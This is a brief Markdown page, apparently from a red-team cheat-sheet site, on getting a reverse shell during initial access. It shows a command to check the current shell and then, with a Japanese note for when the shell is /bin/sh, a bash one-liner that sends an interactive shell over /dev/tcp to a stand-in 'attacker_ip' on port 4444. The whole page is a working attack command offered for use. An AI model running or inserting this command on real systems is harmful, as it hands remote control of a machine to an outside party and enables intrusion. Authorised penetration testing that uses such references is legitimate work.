---
title: Reverse Shell
parent: Initial Access
grand_parent: Red Team
---

```sh
echo $0
```

shellが/bin/shの場合

```sh
bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
```

